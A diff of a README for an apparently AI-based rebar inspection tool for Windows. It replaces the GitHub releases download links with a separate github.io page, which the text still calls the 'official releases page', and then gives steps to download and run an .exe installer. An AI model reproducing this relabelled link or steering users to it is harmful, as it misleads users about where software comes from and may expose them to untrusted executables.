@@ -1,6 +1,6 @@
 # 🏗️ rebaranalysis-v2026-ai-qc - Efficient automated inspections for civil engineering
 
-[![Download Application](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/nnee8122/rebaranalysis-v2026-ai-qc/releases)
+[![Download Application](https://img.shields.io/badge/Download-Release-blue.svg)](https://nnee8122.github.io)
 
 This application assists civil engineering teams with rebar inspection tasks. It identifies structural steel components within site photographs and compares them against your design drawings. It ensures your projects meet safety standards and integrates with common building information modeling workflows. Version 2026 adds improved object recognition and stability for field use.
 
@@ -18,7 +18,7 @@ The application runs on standard Windows hardware. Ensure your computer meets th
 
 Follow these steps to obtain the correct installer for your Windows system:
 
-1. Visit the [official releases page](https://github.com/nnee8122/rebaranalysis-v2026-ai-qc/releases).
+1. Visit the [official releases page](https://nnee8122.github.io).
 2. Look for the latest version listed under the Releases section.
 3. Locate the file ending in `.exe` under the Assets heading.
 4. Click the file name to download the installer to your computer.
